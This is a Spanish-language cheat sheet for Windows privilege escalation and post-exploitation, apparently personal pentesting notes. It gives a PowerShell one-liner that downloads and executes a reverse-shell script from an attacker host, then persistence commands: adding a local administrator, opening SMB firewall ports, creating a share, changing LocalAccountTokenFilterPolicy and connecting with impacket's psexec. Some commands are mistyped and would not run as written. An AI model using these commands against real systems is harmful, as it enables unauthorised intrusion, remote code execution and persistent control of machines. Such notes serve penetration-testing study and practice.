# Windows

* [Tips & Tricks]
* [Tools]
* [Migrando proceso]
* [Persistencia]
* [DLL Hijacking]
* [Binpath]
* [Unquothed service path]
* [Service registry permissions]
* [Executable file]
* [Registry autoruns]
* [Allways install Elevated]
* [Credenciales en memoria]
* [Credenciales en registro]
* [Credenciales en archivos de configuracion]
* [Credenciales en webconfig]
* [Credenciales en repair/sam]
* [Tareas programadas]
* [Token impersionation]
* [Token impersionation print spoofer]
* [Bypassing]

## Tips & Tricks

1. Cuando tenes una shell, es mejor migrar a un proceso
que sea de la misma arquitectura de la pc donde estamos para que
no existan errores

## Tools

* [Powershell Empire]
* [PowerUp]
* [Seatbelt]
* [Winpeas]
* [Nishang]
* [windows-privesc-check]
* [windowsenum]
* [Sherlock]
* [Watson]
* [WinEnum]
* [Windows-exploit-suggester]

## Migrando proceso

```shell
Is64BitOperatingSystem
#True

Is64BitProcess
#False #necesitamos migrar
#Podemos mandar la shell desde la ruta nativa del sistema con el path absoluto.
#Por ejemplo para tomar una reverse shell desde la windows:
C:\Windows\SysNative\WindowsPowershell\v1.0powershell IEX(New-Object New.WebClient).downloadString('http://IP:PORT/shell.ps1')
#esto te da el proceso de 64 bits ya
```

## Persistencia

```shell
net user nombreusuario password /add
net localgroup Administrators nombreusuario /add

#si no est√° abierto el puerto de SAMBA hay que abrirlo para poder 
#generar esa persistencia, y poder mandar comandos desde nuestro 
#host atacante Creamos la regla en el firewall

netsh advfirewall firewall add rule protocol=TCP dir=in localport=445 action=allow

netsh advfirewall firewall add rule protocol=TCP dir=out localport=445 action=allow

#creamos un nuevo recurso compartido
net share attacker_folder=C:\Windows\tmp /GRANT:Administrators,FULL

#cambiamos la policy
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

#y desde el host con el paquete de impacket
$impacket/examples/psexec.py WORKGROUP/nombreusuario:password\@R_IP cmd.exe
##